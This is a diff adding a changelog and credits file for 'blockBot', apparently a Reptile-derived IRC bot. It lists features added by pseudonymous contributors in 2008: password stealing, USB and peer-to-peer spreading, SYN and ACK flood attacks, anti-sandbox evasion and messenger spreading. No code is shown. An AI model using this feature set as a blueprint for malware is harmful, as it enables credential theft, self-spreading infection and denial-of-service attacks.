@@ -1,0 +1,37 @@
+blockBot - Orginal Reptile by (x80)
+Stripped by sZ (before jail :s)
+MSN added by Cybix (Munk's code)
+AIM/Triton added by Cybix (nocen's code)
+AIM/triton message is now static and can be changed within the bot.
+PSTORE Password grabber added by h1t3m 
+USB Spread added by h1t3m 	
+DDoS-Syn|Supersyn|ack|rnd Added by h1t3m 
+Visit url added by h1t3m 		
+Auto-uTorrent seeder by h1t3m (a59's code modded) 
+Auto-Azureus Seeder by h1t3m (also a59's code modded)
+join/part added ~ h1t3m 		
+Added flexability to change pstore/usb chan ~h1t3m
+peer2peer spreader added ~ h1t3m 	
+Anti-Sandbox by h1t3m
+Added kazaa, edonkey, Morpheus, BearShare, ICQ, Grokster and My Downloads to p2p spread. - h1t3m
+added more sandbox apps to anti-sandbox - h1t3m
+
+-----------------------------------------------------------------------------------
+
+blockBot - Orginal Reptile by (x80)
+Stripped by sZ (before jail :s)
+MSN added by Cybix (Munk's code)
+AIM/Triton added by Cybix (nocen's code)
+AIM/triton message is now static and can be changed within the bot.
+PSTORE Password grabber 			[29/5/08]
+USB Spread					[30/5/08]
+DDoS-Syn|Supersyn|ack|rnd 			[1/6/08]
+Visit url					[1/6/08]
+Auto-uTorrent seeder				[3/6/08]
+Auto-Azureus Seeder				[3/6/08]
+join/part added					[4/6/08]
+Added flexability to change pstore/usb chan	[4/6/08]
+peer2peer spreader				[5/6/08]
+anti-Sandbox					[5/6/08]
+p2p updated					[8/6/08]
+anti sandbox updated				[8/6/08]
